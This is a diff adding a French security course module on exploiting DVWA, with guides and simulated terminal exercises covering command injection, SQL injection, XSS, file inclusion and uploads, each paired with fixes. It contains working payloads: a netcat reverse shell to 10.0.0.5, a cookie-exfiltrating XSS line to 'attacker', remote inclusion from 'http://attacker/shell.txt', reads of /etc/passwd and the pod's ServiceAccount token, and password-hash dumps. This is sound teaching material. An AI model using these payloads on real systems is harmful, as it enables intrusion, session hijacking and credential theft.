@@ -1500,4 +1500,551 @@
     ]
   });
 
+  /* =========================================================
+     GUIDE G8 — Exploiter DVWA : les vulnérabilités web
+     ========================================================= */
+  C.guides.push({
+    id: "faille-dvwa-web",
+    titre: "Faille pas à pas — Les vulnérabilités web de DVWA",
+    resume: "Injection de commande, injection SQL, XSS, inclusion de fichier, upload : pour chacune, comment la faille naît dans le code, comment l'exploiter en labo, et comment la corriger. C'est le vecteur d'accès initial qui mène au shell dans le pod.",
+    duree: "40 min",
+    niveau: "Intermédiaire",
+    badge: "Faille pas à pas",
+    prealables: [
+      "Cadre : DVWA (Damn Vulnerable Web Application) est une appli VOLONTAIREMENT vulnérable, déployée dans un labo isolé (TP5). On n'exploite jamais ces techniques hors d'un environnement autorisé.",
+      "Avoir déployé DVWA (pod dans le namespace `dvwa-lab`) et réglé « DVWA Security » sur *Low* pour débuter."
+    ],
+    sections: [
+      {
+        type: "notion",
+        titre: "À quoi sert DVWA et où l'on se trouve",
+        texte: "DVWA rejoue les failles web classiques (celles du Top 10 OWASP) dans un bac à sable. En sécurité offensive comme défensive, on l'utilise pour **comprendre le mécanisme** d'une faille avant de savoir la corriger.",
+        points: [
+          "Repère d'arbre : DVWA tourne **dans un pod** (sur un worker). Exploiter une faille de DVWA, c'est faire exécuter du code **dans le conteneur du pod** — pas sur votre poste.",
+          "L'objectif final (TP5) : passer d'une faille web à un **shell dans le pod**, puis pivoter vers le cluster via le token du ServiceAccount (voir « Token de pod et RBAC »).",
+          "Trois niveaux de difficulté dans DVWA : *Low* (aucun filtre), *Medium* (filtres naïfs à contourner), *High* (filtres plus stricts)."
+        ],
+        remarque: "Règle d'or : une faille web se comprend par le code qui la produit. On montre donc à chaque fois le motif vulnérable, l'exploitation, puis le correctif."
+      },
+
+      /* -------- Injection de commande -------- */
+      {
+        titre: "Injection de commande — le mécanisme",
+        texte: "La page « Command Injection » de DVWA prend une IP et lance un `ping`. En *Low*, l'entrée est concaténée telle quelle dans une commande shell : tout ce que vous ajoutez après un séparateur est exécuté.",
+        legende: "Code vulnérable (simplifié)",
+        code: "// PHP — l'entrée utilisateur va directement dans le shell\n$ip = $_REQUEST['ip'];\n$out = shell_exec('ping -c 1 ' . $ip);   // <-- aucune validation",
+        attention: "Le problème n'est pas `ping`, c'est de construire une commande shell par concaténation d'une entrée utilisateur."
+      },
+      {
+        titre: "Injection de commande — exploiter (Low)",
+        texte: "On chaîne une seconde commande derrière un séparateur. La sortie s'affiche dans la page.",
+        tableau: {
+          entetes: ["Charge (dans le champ IP)", "Effet"],
+          lignes: [
+            ["`127.0.0.1; id`", "Exécute `id` après le ping (séparateur `;`)"],
+            ["`127.0.0.1; uname -a`", "Version du noyau du conteneur"],
+            ["`127.0.0.1; cat /etc/passwd`", "Lit un fichier du conteneur"],
+            ["`127.0.0.1; ls -la /var/run/secrets/kubernetes.io/serviceaccount`", "Révèle qu'on est dans un pod (token présent)"]
+          ]
+        },
+        remarque: "La dernière charge est le pont vers Kubernetes : trouver le dossier `serviceaccount`, c'est confirmer qu'on est dans un pod exploitable."
+      },
+      {
+        titre: "Injection de commande — contourner les filtres (Medium / High)",
+        texte: "En *Medium*, DVWA retire naïvement `;` et `&&`. On utilise d'autres séparateurs. En *High*, la liste noire s'allonge : on passe par un saut de ligne encodé ou une substitution.",
+        tableau: {
+          entetes: ["Contournement", "Idée"],
+          lignes: [
+            ["`127.0.0.1| id`", "Le pipe `|` n'est pas filtré en Medium"],
+            ["`127.0.0.1%0a id`", "`%0a` = saut de ligne : nouvelle commande"],
+            ["``127.0.0.1`id` ``", "Substitution par accents graves"],
+            ["`127.0.0.1| id > /var/www/html/o.txt`", "Exfil « aveugle » : écrire la sortie dans un fichier web puis le consulter"]
+          ]
+        },
+        remarque: "Contourner une liste noire est toujours possible : c'est pourquoi la défense n'utilise jamais de liste noire (voir correctif)."
+      },
+      {
+        type: "notion",
+        titre: "Injection de commande — corriger",
+        texte: "On ne filtre pas les « mauvais » caractères, on supprime la possibilité même d'injecter.",
+        points: [
+          "**Ne pas appeler de shell** : utiliser une fonction/bibliothèque native (résolution DNS, ping applicatif) plutôt que `shell_exec`.",
+          "Si un binaire externe est indispensable, passer les arguments **en tableau** (pas de chaîne interprétée par un shell) : `execFile('ping', ['-c','1', ip])`.",
+          "**Valider en liste blanche** : ici, l'entrée doit correspondre à une IP (`/^\\d{1,3}(\\.\\d{1,3}){3}$/`), sinon rejet.",
+          "Principe de moindre privilège : le service web ne doit pas tourner en root dans le conteneur."
+        ]
+      },
+
+      /* -------- Injection SQL -------- */
+      {
+        titre: "Injection SQL — le mécanisme",
+        texte: "La page « SQL Injection » cherche un utilisateur par identifiant. En *Low*, l'`id` est concaténé dans la requête : une apostrophe suffit à sortir de la chaîne et à réécrire la logique.",
+        legende: "Code vulnérable (simplifié)",
+        code: "// PHP — l'id utilisateur est collé dans la requête\n$id = $_REQUEST['id'];\n$q = \"SELECT first_name, last_name FROM users WHERE user_id = '$id'\";",
+        attention: "Une entrée `1' OR '1'='1` transforme la condition en « toujours vrai » : toutes les lignes sortent."
+      },
+      {
+        titre: "Injection SQL — exploiter (UNION)",
+        texte: "On confirme l'injection, on trouve le nombre de colonnes, puis on utilise `UNION SELECT` pour lire d'autres tables. Le `-- -` commente la fin de la requête d'origine.",
+        tableau: {
+          entetes: ["Charge (dans le champ User ID)", "But"],
+          lignes: [
+            ["`1' OR '1'='1`", "Confirmer l'injection (renvoie tout)"],
+            ["`1' ORDER BY 2 -- -`", "Trouver le nombre de colonnes (2 ici)"],
+            ["`1' UNION SELECT null, version() -- -`", "Lire la version de la base"],
+            ["`1' UNION SELECT null, table_name FROM information_schema.tables -- -`", "Lister les tables"],
+            ["`1' UNION SELECT user, password FROM users -- -`", "Extraire identifiants et empreintes"]
+          ]
+        },
+        remarque: "Les empreintes extraites se cassent hors ligne (hashcat/john). C'est pourquoi un hachage lent et salé est essentiel côté défense."
+      },
+      {
+        titre: "Injection SQL — à l'aveugle (blind)",
+        texte: "Quand aucune donnée ne s'affiche, on déduit l'information d'un comportement : page différente (booléen) ou temps de réponse (temporel).",
+        tableau: {
+          entetes: ["Charge", "Technique"],
+          lignes: [
+            ["`1' AND '1'='1`", "Booléen vrai : page normale"],
+            ["`1' AND '1'='2`", "Booléen faux : page différente"],
+            ["`1' AND SUBSTRING(version(),1,1)='8`", "Extraire caractère par caractère"],
+            ["`1' AND SLEEP(5) -- -`", "Temporel : la réponse tarde de 5 s"],
+            ["`1' AND IF(SUBSTRING((SELECT password FROM users LIMIT 1),1,1)='a',SLEEP(3),0) -- -`", "Extraction temporelle conditionnelle"]
+          ]
+        }
+      },
+      {
+        type: "notion",
+        titre: "Injection SQL — corriger",
+        texte: "La seule défense fiable est de séparer le code SQL des données.",
+        points: [
+          "**Requêtes préparées / paramétrées** : `... WHERE user_id = ?` puis on lie la valeur. La donnée n'est jamais interprétée comme du SQL.",
+          "**Compte de base de données à moindre privilège** : l'appli ne doit pas être `root` MySQL ni lire `information_schema` si inutile.",
+          "**Hachage lent et salé** des mots de passe (bcrypt/argon2), jamais MD5.",
+          "Défense en profondeur : WAF, messages d'erreur génériques, journalisation des requêtes anormales."
+        ]
+      },
+
+      /* -------- XSS -------- */
+      {
+        titre: "XSS — le mécanisme et l'exploitation",
+        texte: "Le Cross-Site Scripting injecte du JavaScript qui s'exécute dans le navigateur d'autres victimes. **Reflected** : la charge est renvoyée dans la réponse ; **Stored** : elle est enregistrée (ex. un commentaire) et rejouée à chaque visite.",
+        code: "<!-- Reflected : dans un champ renvoyé sans échappement -->\n<script>alert(document.cookie)</script>\n\n<!-- Stored : vol de session vers un serveur contrôlé -->\n<script>new Image().src='http://attacker/c?'+document.cookie</script>",
+        attention: "Impact typique : vol du cookie de session (donc du compte). En labo uniquement."
+      },
+      {
+        type: "notion",
+        titre: "XSS — corriger",
+        texte: "On neutralise le contenu injecté à l'affichage.",
+        points: [
+          "**Échapper la sortie** selon le contexte (HTML, attribut, JS) — `htmlspecialchars` en PHP.",
+          "**Content-Security-Policy** stricte : interdit les scripts en ligne non prévus.",
+          "Cookies `HttpOnly` (inaccessibles au JS) et `Secure`.",
+          "Valider/assainir les entrées côté serveur, jamais seulement côté client."
+        ]
+      },
+
+      /* -------- Inclusion de fichier & upload -------- */
+      {
+        titre: "Inclusion de fichier (LFI/RFI) et upload",
+        texte: "L'inclusion de fichier charge un fichier dont le nom vient de l'utilisateur ; l'upload accepte un fichier qui peut devenir exécutable. Deux voies fréquentes vers l'exécution de code.",
+        tableau: {
+          entetes: ["Charge / action", "Effet"],
+          lignes: [
+            ["`?page=../../../../etc/passwd`", "LFI : remonter l'arborescence pour lire un fichier"],
+            ["`?page=php://filter/convert.base64-encode/resource=index`", "Lire le code source PHP encodé"],
+            ["`?page=http://attacker/shell.txt`", "RFI : inclure un fichier distant (si `allow_url_include`)"],
+            ["Upload d'un `shell.php`", "Déposer un webshell puis l'appeler pour exécuter des commandes"]
+          ]
+        },
+        remarque: "Un webshell uploadé, c'est un accès shell dans le pod : même destination que l'injection de commande."
+      },
+      {
+        type: "notion",
+        titre: "Inclusion / upload — corriger",
+        texte: "On enlève à l'utilisateur le contrôle des chemins et de l'exécution.",
+        points: [
+          "Inclure via une **liste blanche** de pages (une correspondance `clé → fichier`), jamais un chemin fourni par l'utilisateur.",
+          "Désactiver `allow_url_include` / `allow_url_fopen`.",
+          "Uploads : **valider le type réel**, renommer, stocker **hors de la racine web**, retirer le droit d'exécution.",
+          "Système de fichiers du conteneur en lecture seule (`readOnlyRootFilesystem`) : un webshell ne peut plus s'écrire."
+        ]
+      },
+      {
+        type: "notion",
+        titre: "Du web au cluster : l'accès initial",
+        texte: "Toutes ces failles convergent vers un même but offensif : exécuter des commandes dans le conteneur du pod, puis obtenir un shell interactif.",
+        points: [
+          "Injection de commande ou webshell → exécution de commandes dans le pod.",
+          "Reverse shell → shell interactif : on écoute sur sa machine (`nc -lvnp 4444`) et on fait revenir le pod vers nous.",
+          "Une fois dans le pod, on lit le **token du ServiceAccount** et on attaque l'apiserver (chapitre « Pentest et défense d'un cluster »).",
+          "Défense : corriger la faille applicative reste la priorité ; la détection (Falco) repère le shell anormal si la prévention échoue."
+        ],
+        remarque: "C'est exactement l'enchaînement du TP5 : faille web (ex.1) → token & RBAC (ex.2) → détection Falco (ex.3)."
+      }
+    ]
+  });
+
+  /* =========================================================
+     CHAPITRE — Injection de commande (DVWA), 3 niveaux
+     Terminal détourné en simulateur de « charge » : ce que
+     vous tapez est le PAYLOAD saisi dans le champ vulnérable.
+     ========================================================= */
+  C.chapitres.push({
+    id: "ch-dvwa-cmdi",
+    titre: "Chapitre 7 — Injection de commande (DVWA)",
+    description: "Trois terminaux où ce que vous tapez est la charge saisie dans le champ « Ping » de DVWA : injection simple, passage à un reverse shell (accès initial), puis contournement des filtres.",
+    exercices: [
+
+      /* ---- N1 : injection simple (Low) ---- */
+      {
+        type: "terminal",
+        id: "term-dvwa-cmdi-low",
+        titre: "Niveau 1 — Injecter une commande (sécurité Low)",
+        terminal: "DVWA ▸ Command Injection ▸ champ « Ping a Host »",
+        invite: "DVWA[cmd-injection] IP>",
+        cours: "Le champ « Ping » lance `ping <votre saisie>` sans validation. En ajoutant un séparateur `;`, votre commande s'exécute dans le conteneur du pod. Ce que vous tapez ici est la CHARGE saisie dans le champ web.",
+        exemple: {
+          legende: "Chaîner une commande derrière le ping",
+          code: "127.0.0.1; id"
+        },
+        intro: [
+          "This terminal simulates the DVWA « Ping a Host » field (security = Low). What you type is the payload placed in that field.",
+          "Anything after a `;` runs in the pod's container. Confirm code execution, then discover that DVWA runs inside a Kubernetes pod."
+        ],
+        accueil: "DVWA command injection (Low) — 'help' for a hint, 'solution' to reveal a payload.",
+        objectifs: [
+          {
+            enonce: "Confirmer l'injection : faire exécuter `id` après le ping (séparateur `;`).",
+            indice: "127.0.0.1; id",
+            lieu: "Champ DVWA → commande exécutée dans le pod DVWA (www-data)",
+            motifs: ["127\\.0\\.0\\.1", ";\\s*id\\b"],
+            solution: "127.0.0.1; id",
+            sortie: "PING 127.0.0.1 ... 1 packets transmitted\nuid=33(www-data) gid=33(www-data) groups=33(www-data)"
+          },
+          {
+            enonce: "Récupérer la version du noyau du conteneur.",
+            indice: "… ; uname -a",
+            lieu: "Champ DVWA → exécuté dans le pod DVWA",
+            motifs: ["127\\.0\\.0\\.1", ";", "uname", "-a"],
+            solution: "127.0.0.1; uname -a",
+            sortie: "Linux dvwa-7d9f8c6b4-xk2lp 5.15.0 ... x86_64 GNU/Linux"
+          },
+          {
+            enonce: "Lire un fichier du conteneur : `/etc/passwd`.",
+            indice: "… ; cat /etc/passwd",
+            lieu: "Champ DVWA → exécuté dans le pod DVWA",
+            motifs: ["127\\.0\\.0\\.1", ";", "cat", "/etc/passwd"],
+            solution: "127.0.0.1; cat /etc/passwd",
+            sortie: "root:x:0:0:root:/root:/bin/bash\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin"
+          },
+          {
+            enonce: "Prouver qu'on est dans un **pod** : lister le dossier du ServiceAccount.",
+            indice: "… ; ls /var/run/secrets/kubernetes.io/serviceaccount",
+            lieu: "Champ DVWA → on découvre le token : DVWA tourne dans un pod",
+            motifs: ["127\\.0\\.0\\.1", ";", "ls", "serviceaccount"],
+            solution: "127.0.0.1; ls /var/run/secrets/kubernetes.io/serviceaccount",
+            sortie: "ca.crt  namespace  token   <-- on est bien dans un pod Kubernetes"
+          }
+        ]
+      },
+
+      /* ---- N2 : reverse shell = accès initial (TP5 ex1) ---- */
+      {
+        type: "terminal",
+        id: "term-dvwa-cmdi-shell",
+        titre: "Niveau 2 — De l'injection au reverse shell (accès initial)",
+        terminal: "attaquant + DVWA",
+        invite: "attacker@kali:~$",
+        cours: "Une commande unique ne suffit pas pour travailler : on veut un shell interactif. On écoute sur sa machine, on fait revenir le pod vers nous (reverse shell), puis on stabilise le shell. C'est l'accès initial du TP5 (ex.1) qui alimente les exercices Kubernetes.",
+        exemple: {
+          legende: "Écouter, puis faire revenir la cible",
+          code: "nc -lvnp 4444        # sur l'attaquant\n127.0.0.1; nc 10.0.0.5 4444 -e /bin/sh   # charge DVWA"
+        },
+        intro: [
+          "Two contexts alternate: your attacker machine (listener) and the DVWA field (payload).",
+          "Start a listener, send a reverse-shell payload through the injection, catch the shell — which lands you INSIDE the pod — then stabilise it and locate the token."
+        ],
+        accueil: "Reverse shell — 'help' for a hint, 'solution' to reveal a command/payload.",
+        objectifs: [
+          {
+            enonce: "Sur votre machine, démarrer un **listener** netcat sur le port 4444.",
+            indice: "nc -lvnp 4444",
+            lieu: "Machine de l'attaquant (en écoute)",
+            motifs: ["^nc\\s", "-lvnp", "4444"],
+            solution: "nc -lvnp 4444",
+            sortie: "listening on [any] 4444 ..."
+          },
+          {
+            enonce: "Dans le champ DVWA, injecter un **reverse shell** vers `10.0.0.5:4444`.",
+            indice: "127.0.0.1; nc 10.0.0.5 4444 -e /bin/sh  (ou via /dev/tcp)",
+            lieu: "Champ DVWA → la charge s'exécute dans le pod et rappelle l'attaquant",
+            invite: "DVWA[cmd-injection] IP>",
+            motifs: ["4444", "(nc|/dev/tcp|socat)", "(/bin/sh|/bin/bash)"],
+            solution: "127.0.0.1; nc 10.0.0.5 4444 -e /bin/sh",
+            sortie: "(le champ ne renvoie rien : la connexion part vers l'attaquant)"
+          },
+          {
+            enonce: "Le shell est reçu : confirmer l'identité (vous êtes dans le pod).",
+            indice: "Une commande de trois lettres.",
+            lieu: "Reverse shell OBTENU → dans le conteneur du pod DVWA (www-data)",
+            invite: "www-data@dvwa-7d9f:/var/www/html$",
+            motifs: ["^id\\b"],
+            solution: "id",
+            sortie: "uid=33(www-data) gid=33(www-data) groups=33(www-data)"
+          },
+          {
+            enonce: "Stabiliser le shell en TTY interactif (Python).",
+            indice: "python3 -c 'import pty; pty.spawn(\"/bin/bash\")'",
+            lieu: "Reverse shell dans le pod DVWA",
+            motifs: ["python3", "pty", "spawn"],
+            solution: "python3 -c 'import pty; pty.spawn(\"/bin/bash\")'",
+            sortie: "www-data@dvwa-7d9f:/var/www/html$ (shell interactif stabilisé)"
+          },
+          {
+            enonce: "Localiser le token du ServiceAccount pour préparer le pivot vers le cluster.",
+            indice: "ls /var/run/secrets/kubernetes.io/serviceaccount/",
+            lieu: "Dans le pod DVWA → prêt pour le chapitre « Pentest Kubernetes »",
+            motifs: ["^ls\\s", "serviceaccount"],
+            solution: "ls /var/run/secrets/kubernetes.io/serviceaccount/",
+            sortie: "ca.crt  namespace  token"
+          }
+        ]
+      },
+
+      /* ---- N3 : contourner les filtres (Medium/High) ---- */
+      {
+        type: "terminal",
+        id: "term-dvwa-cmdi-bypass",
+        titre: "Niveau 3 — Contourner les filtres (Medium / High)",
+        terminal: "DVWA ▸ Command Injection ▸ sécurité renforcée",
+        invite: "DVWA[cmd-injection/filtered] IP>",
+        cours: "En Medium/High, DVWA retire certains séparateurs (`;`, `&&`). On contourne avec d'autres : pipe, saut de ligne encodé, accents graves, et exfiltration « aveugle » vers un fichier web. Objectif : montrer pourquoi une liste noire ne protège pas.",
+        exemple: {
+          legende: "Séparateur alternatif quand ; est filtré",
+          code: "127.0.0.1| id"
+        },
+        intro: [
+          "Security is now Medium/High: the `;` separator is stripped. You must reach code execution with other tricks.",
+          "Each objective forbids the naive `;` and asks for a different bypass."
+        ],
+        accueil: "Filter bypass — 'help' for a hint, 'solution' to reveal a payload.",
+        objectifs: [
+          {
+            enonce: "`;` est filtré : exécuter `id` via un **pipe** `|`.",
+            indice: "127.0.0.1| id",
+            lieu: "Champ DVWA filtré → exécuté dans le pod",
+            motifs: ["127\\.0\\.0\\.1", "\\|\\s*id\\b"],
+            interdire: [";"],
+            solution: "127.0.0.1| id",
+            sortie: "uid=33(www-data) gid=33(www-data)"
+          },
+          {
+            enonce: "Contourner via un **saut de ligne encodé** `%0a`.",
+            indice: "127.0.0.1%0a id",
+            lieu: "Champ DVWA filtré → exécuté dans le pod",
+            motifs: ["127\\.0\\.0\\.1", "%0a", "id\\b"],
+            interdire: [";", "\\|"],
+            solution: "127.0.0.1%0a id",
+            sortie: "uid=33(www-data) gid=33(www-data)"
+          },
+          {
+            enonce: "Contourner via une **substitution** par accents graves.",
+            indice: "Entourez la commande d'accents graves : 127.0.0.1`id`",
+            lieu: "Champ DVWA filtré → exécuté dans le pod",
+            motifs: ["127\\.0\\.0\\.1", "`id`"],
+            interdire: [";", "\\|", "%0a"],
+            solution: "127.0.0.1`id`",
+            sortie: "(ping tente de résoudre le résultat de `id` : la commande est bien exécutée)"
+          },
+          {
+            enonce: "Exfiltration **aveugle** : écrire la sortie dans un fichier du webroot pour le consulter ensuite.",
+            indice: "127.0.0.1| id > /var/www/html/o.txt",
+            lieu: "Champ DVWA filtré → écrit dans le pod, lisible via le navigateur",
+            motifs: ["127\\.0\\.0\\.1", "id", ">", "/var/www/html"],
+            solution: "127.0.0.1| id > /var/www/html/o.txt",
+            sortie: "(o.txt créé — ouvrez http://<dvwa>/o.txt pour lire la sortie)"
+          }
+        ]
+      }
+    ]
+  });
+
+  /* =========================================================
+     CHAPITRE — Injection SQL (DVWA), 3 niveaux
+     ========================================================= */
+  C.chapitres.push({
+    id: "ch-dvwa-sqli",
+    titre: "Chapitre 8 — Injection SQL (DVWA)",
+    description: "Trois terminaux où votre saisie est la charge du champ « User ID » : injection de base, extraction par UNION (niveau TP), puis injection à l'aveugle (booléenne et temporelle).",
+    exercices: [
+
+      /* ---- N1 : bases ---- */
+      {
+        type: "terminal",
+        id: "term-dvwa-sqli-basic",
+        titre: "Niveau 1 — Injection SQL de base",
+        terminal: "DVWA ▸ SQL Injection ▸ champ « User ID »",
+        invite: "DVWA[sql-injection] User ID>",
+        cours: "Le champ « User ID » construit `... WHERE user_id = '<saisie>'`. Une apostrophe sort de la chaîne. On confirme l'injection, on compte les colonnes, on prépare l'UNION. `-- -` commente la fin de la requête.",
+        exemple: {
+          legende: "Rendre la condition toujours vraie",
+          code: "1' OR '1'='1"
+        },
+        intro: [
+          "This terminal simulates the DVWA « User ID » field (security = Low). Your input is the SQL payload.",
+          "Confirm the injection, find the column count, then read the database version with a UNION."
+        ],
+        accueil: "SQL injection (Low) — 'help' for a hint, 'solution' to reveal a payload.",
+        objectifs: [
+          {
+            enonce: "Confirmer l'injection : condition **toujours vraie** (`OR '1'='1`).",
+            indice: "1' OR '1'='1",
+            lieu: "Champ DVWA → requête MySQL dans le pod",
+            motifs: ["OR\\s+'?1'?\\s*=\\s*'?1"],
+            solution: "1' OR '1'='1",
+            sortie: "ID: 1  First name: admin  Surname: admin\nID: 2  First name: Gordon ...  (toutes les lignes)"
+          },
+          {
+            enonce: "Trouver le **nombre de colonnes** avec `ORDER BY`.",
+            indice: "1' ORDER BY 2 -- -",
+            lieu: "Champ DVWA → requête MySQL",
+            motifs: ["ORDER\\s+BY", "--"],
+            solution: "1' ORDER BY 2 -- -",
+            sortie: "(2 = OK ; ORDER BY 3 renverrait « Unknown column » : 2 colonnes)"
+          },
+          {
+            enonce: "Injecter un `UNION SELECT` à 2 colonnes.",
+            indice: "1' UNION SELECT 1,2 -- -",
+            lieu: "Champ DVWA → requête MySQL",
+            motifs: ["UNION\\s+SELECT", "1,2", "--"],
+            solution: "1' UNION SELECT 1,2 -- -",
+            sortie: "First name: 1  Surname: 2   (les colonnes 1 et 2 s'affichent)"
+          },
+          {
+            enonce: "Lire la **version** de la base via l'UNION.",
+            indice: "1' UNION SELECT null, version() -- -",
+            lieu: "Champ DVWA → requête MySQL",
+            motifs: ["UNION\\s+SELECT", "version", "--"],
+            solution: "1' UNION SELECT null, version() -- -",
+            sortie: "Surname: 8.0.36-0ubuntu0.22.04"
+          }
+        ]
+      },
+
+      /* ---- N2 : extraction par UNION (TP) ---- */
+      {
+        type: "terminal",
+        id: "term-dvwa-sqli-union",
+        titre: "Niveau 2 — Extraire la base par UNION (niveau TP)",
+        terminal: "DVWA ▸ SQL Injection ▸ champ « User ID »",
+        invite: "DVWA[sql-injection] User ID>",
+        cours: "Avec l'UNION maîtrisé, on cartographie la base via `information_schema`, puis on extrait les identifiants et les empreintes de la table `users`.",
+        exemple: {
+          legende: "Extraire identifiants et empreintes",
+          code: "1' UNION SELECT user, password FROM users -- -"
+        },
+        intro: [
+          "You already control a 2-column UNION on the User ID field.",
+          "Enumerate tables and columns via information_schema, then dump the users table."
+        ],
+        accueil: "UNION extraction — 'help' for a hint, 'solution' to reveal a payload.",
+        objectifs: [
+          {
+            enonce: "Lister les **tables** de la base via `information_schema`.",
+            indice: "1' UNION SELECT null, table_name FROM information_schema.tables -- -",
+            lieu: "Champ DVWA → requête MySQL",
+            motifs: ["UNION\\s+SELECT", "information_schema\\.tables", "--"],
+            solution: "1' UNION SELECT null, table_name FROM information_schema.tables -- -",
+            sortie: "Surname: users\nSurname: guestbook ..."
+          },
+          {
+            enonce: "Lister les **colonnes** de la table `users`.",
+            indice: "… FROM information_schema.columns WHERE table_name='users' -- -",
+            lieu: "Champ DVWA → requête MySQL",
+            motifs: ["UNION\\s+SELECT", "information_schema\\.columns", "users", "--"],
+            solution: "1' UNION SELECT null, column_name FROM information_schema.columns WHERE table_name='users' -- -",
+            sortie: "Surname: user_id\nSurname: user\nSurname: password ..."
+          },
+          {
+            enonce: "**Extraire** les identifiants et empreintes de `users`.",
+            indice: "1' UNION SELECT user, password FROM users -- -",
+            lieu: "Champ DVWA → requête MySQL (fuite de données)",
+            motifs: ["UNION\\s+SELECT", "FROM\\s+users", "password"],
+            solution: "1' UNION SELECT user, password FROM users -- -",
+            sortie: "First name: admin  Surname: 5f4dcc3b5aa765d61d8327deb882cf99\n(empreintes MD5 à casser hors ligne)"
+          },
+          {
+            enonce: "Afficher l'**utilisateur MySQL** courant de l'application.",
+            indice: "1' UNION SELECT null, current_user() -- -",
+            lieu: "Champ DVWA → requête MySQL",
+            motifs: ["UNION\\s+SELECT", "current_user", "--"],
+            solution: "1' UNION SELECT null, current_user() -- -",
+            sortie: "Surname: dvwa@localhost   (privilèges à vérifier côté défense)"
+          }
+        ]
+      },
+
+      /* ---- N3 : injection à l'aveugle (harder) ---- */
+      {
+        type: "terminal",
+        id: "term-dvwa-sqli-blind",
+        titre: "Niveau 3 — Injection à l'aveugle (booléenne et temporelle)",
+        terminal: "DVWA ▸ SQL Injection (Blind)",
+        invite: "DVWA[sql-blind] User ID>",
+        cours: "Quand aucune donnée ne s'affiche, on déduit l'information d'un comportement : différence de page (booléen) ou délai de réponse (temporel). Plus lent, mais imparable. C'est le niveau le plus exigeant.",
+        exemple: {
+          legende: "Faire « dormir » la base pour déduire une réponse",
+          code: "1' AND SLEEP(5) -- -"
+        },
+        intro: [
+          "Blind SQL injection: the page never prints query data. You infer it from true/false page changes or response delays.",
+          "Work up from a boolean oracle to a time-based, character-by-character extraction."
+        ],
+        accueil: "Blind SQLi — 'help' for a hint, 'solution' to reveal a payload.",
+        objectifs: [
+          {
+            enonce: "Établir l'oracle **booléen vrai** (`AND '1'='1`).",
+            indice: "1' AND '1'='1",
+            lieu: "Champ DVWA → requête MySQL (blind)",
+            motifs: ["AND\\s+'?1'?\\s*=\\s*'?1"],
+            solution: "1' AND '1'='1",
+            sortie: "User ID exists in the database.   (condition vraie : page « normale »)"
+          },
+          {
+            enonce: "Établir l'oracle **booléen faux** (`AND '1'='2`).",
+            indice: "1' AND '1'='2",
+            lieu: "Champ DVWA → requête MySQL (blind)",
+            motifs: ["AND\\s+'?1'?\\s*=\\s*'?2"],
+            solution: "1' AND '1'='2",
+            sortie: "User ID is MISSING from the database.   (condition fausse : page différente)"
+          },
+          {
+            enonce: "Extraire par booléen : premier caractère de la version vaut-il `8` ?",
+            indice: "1' AND SUBSTRING(version(),1,1)='8",
+            lieu: "Champ DVWA → requête MySQL (blind)",
+            motifs: ["SUBSTRING", "version"],
+            solution: "1' AND SUBSTRING(version(),1,1)='8",
+            sortie: "User ID exists ...  → le 1er caractère de la version est bien « 8 »"
+          },
+          {
+            enonce: "Passer au **temporel** : forcer un délai de 5 secondes (`SLEEP`).",
+            indice: "1' AND SLEEP(5) -- -",
+            lieu: "Champ DVWA → requête MySQL (blind, temporel)",
+            motifs: ["SLEEP\\(", "--"],
+            solution: "1' AND SLEEP(5) -- -",
+            sortie: "(la réponse arrive après ~5 s : le canal temporel fonctionne)"
+          },
+          {
+            enonce: "Extraction **temporelle conditionnelle** du 1er caractère du mot de passe.",
+            indice: "… AND IF(SUBSTRING((SELECT password FROM users LIMIT 1),1,1)='a', SLEEP(3), 0) -- -",
+            lieu: "Champ DVWA → requête MySQL (blind, exfiltration)",
+            motifs: ["IF\\(", "SLEEP", "SUBSTRING", "password"],
+            solution: "1' AND IF(SUBSTRING((SELECT password FROM users LIMIT 1),1,1)='a', SLEEP(3), 0) -- -",
+            sortie: "(délai de 3 s si le caractère testé est « a » ; on itère sur chaque position)"
+          }
+        ]
+      }
+    ]
+  });
+
 })();
